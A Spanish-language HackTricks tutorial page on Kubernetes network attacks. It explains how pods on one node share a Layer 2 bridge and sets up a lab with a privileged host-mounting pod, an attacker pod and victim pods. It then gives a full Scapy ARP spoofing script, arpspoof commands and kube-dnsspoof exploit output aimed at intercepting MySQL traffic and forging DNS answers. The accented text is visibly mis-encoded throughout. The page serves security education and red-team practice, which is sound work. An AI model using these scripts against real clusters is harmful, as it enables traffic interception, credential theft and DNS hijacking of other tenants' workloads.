# Kubernetes Network Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Introducci√≥n

En Kubernetes, se observa que un comportamiento predeterminado permite el establecimiento de conexiones entre **todos los contenedores que residen en el mismo nodo**. Esto se aplica independientemente de las distinciones de espacio de nombres. Tal conectividad se extiende hasta **Capa 2** (Ethernet). En consecuencia, esta configuraci√≥n potencialmente expone al sistema a vulnerabilidades. Espec√≠ficamente, abre la posibilidad de que un **contenedor malicioso** ejecute un **ataque de suplantaci√≥n ARP** contra otros contenedores situados en el mismo nodo. Durante tal ataque, el contenedor malicioso puede interceptar o modificar enga√±osamente el tr√°fico de red destinado a otros contenedores.

Los ataques de suplantaci√≥n ARP implican que el **atacante env√≠e mensajes ARP falsificados** (Protocolo de Resoluci√≥n de Direcciones) a trav√©s de una red de √°rea local. Esto resulta en la vinculaci√≥n de la **direcci√≥n MAC del atacante con la direcci√≥n IP de una computadora o servidor leg√≠timo en la red**. Despu√©s de la ejecuci√≥n exitosa de tal ataque, el atacante puede interceptar, modificar o incluso detener datos en tr√°nsito. El ataque se ejecuta en la Capa 2 del modelo OSI, raz√≥n por la cual la conectividad predeterminada en Kubernetes en esta capa plantea preocupaciones de seguridad.

En el escenario se van a crear 4 m√°quinas:

* ubuntu-pe: M√°quina privilegiada para escapar al nodo y verificar m√©tricas (no necesaria para el ataque)
* **ubuntu-attack**: **Contenedor malicioso** en el espacio de nombres predeterminado
* **ubuntu-victim**: M√°quina **v√≠ctima** en el espacio de nombres kube-system
* **mysql**: M√°quina **v√≠ctima** en el espacio de nombres predeterminado
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Redes B√°sicas de Kubernetes

Si deseas m√°s detalles sobre los temas de redes introducidos aqu√≠, consulta las referencias.

### ARP

En t√©rminos generales, **la red de pod a pod dentro del nodo** est√° disponible a trav√©s de un **puente** que conecta todos los pods. Este puente se llama ‚Äú**cbr0**‚Äù. (Algunos complementos de red instalar√°n su propio puente.) El **cbr0 tambi√©n puede manejar ARP** (Protocolo de Resoluci√≥n de Direcciones). Cuando un paquete entrante llega a cbr0, puede resolver la direcci√≥n MAC de destino utilizando ARP.

Este hecho implica que, por defecto, **cada pod que se ejecuta en el mismo nodo** podr√° **comunicarse** con cualquier otro pod en el mismo nodo (independientemente del espacio de nombres) a nivel de ethernet (capa 2).

{% hint style="warning" %}
Por lo tanto, es posible realizar ataques de **ARP Spoofing entre pods en el mismo nodo.**
{% endhint %}

### DNS

En entornos de kubernetes, generalmente encontrar√°s 1 (o m√°s) **servicios DNS en ejecuci√≥n** usualmente en el espacio de nombres kube-system:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
En la informaci√≥n anterior, puedes ver algo interesante, la **IP del servicio** es **10.96.0.10** pero la **IP del pod** que ejecuta el servicio es **172.17.0.2.**

Si verificas la direcci√≥n DNS dentro de cualquier pod, encontrar√°s algo como esto:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
Sin embargo, el pod **no sabe** c√≥mo llegar a esa **direcci√≥n** porque el **rango de pods** en este caso es 172.17.0.10/26.

Por lo tanto, el pod enviar√° las **solicitudes DNS a la direcci√≥n 10.96.0.10** que ser√° **traducida** por el cbr0 **a** **172.17.0.2**.

{% hint style="warning" %}
Esto significa que una **solicitud DNS** de un pod **siempre** va a ir al **puente** para **traducir** la **IP del servicio a la IP del endpoint**, incluso si el servidor DNS est√° en la misma subred que el pod.

Sabiendo esto, y sabiendo que **los ataques ARP son posibles**, un **pod** en un nodo podr√° **interceptar el tr√°fico** entre **cada pod** en la **subred** y el **puente** y **modificar** las **respuestas DNS** del servidor DNS (**DNS Spoofing**).

Adem√°s, si el **servidor DNS** est√° en el **mismo nodo que el atacante**, el atacante puede **interceptar todas las solicitudes DNS** de cualquier pod en el cl√∫ster (entre el servidor DNS y el puente) y modificar las respuestas.
{% endhint %}

## Suplantaci√≥n ARP en pods en el mismo Nodo

Nuestro objetivo es **robar al menos la comunicaci√≥n del ubuntu-victim al mysql**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

Como ya se mencion√≥, si **comprometes un pod en el mismo nodo del pod del servidor DNS**, puedes **MitM** con **ARPSpoofing** el **puente y el pod DNS** y **modificar todas las respuestas DNS**.

Tienes una muy buena **herramienta** y **tutorial** para probar esto en [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

En nuestro escenario, **descarga** la **herramienta** en el pod atacante y crea un \*\*archivo llamado `hosts` \*\* con los **dominios** que deseas **spoof** como:
```
cat hosts
google.com. 1.1.1.1
```
Realiza el ataque a la m√°quina ubuntu-victim:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
Si intentas crear tu propio script de suplantaci√≥n de DNS, si **solo modificas la respuesta de DNS** eso **no** va a **funcionar**, porque la **respuesta** va a tener una **IP de origen** la direcci√≥n IP del **pod** **malicioso** y **no ser√°** **aceptada**.\
Necesitas generar un **nuevo paquete DNS** con la **IP de origen** del **DNS** donde la v√≠ctima env√≠a la solicitud DNS (que es algo como 172.16.0.2, no 10.96.0.10, esa es la IP del servicio DNS de K8s y no la IP del servidor DNS, m√°s sobre esto en la introducci√≥n).
{% endhint %}

## Capturando Tr√°fico

La herramienta [**Mizu**](https://github.com/up9inc/mizu) es un simple pero poderoso **visor de tr√°fico API para Kubernetes** que te permite **ver toda la comunicaci√≥n API** entre microservicios para ayudarte a depurar y solucionar regresiones.\
Instalar√° agentes en los pods seleccionados y recopilar√° su informaci√≥n de tr√°fico y te la mostrar√° en un servidor web. Sin embargo, necesitar√°s altos permisos de K8s para esto (y no es muy sigiloso).

## Referencias

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
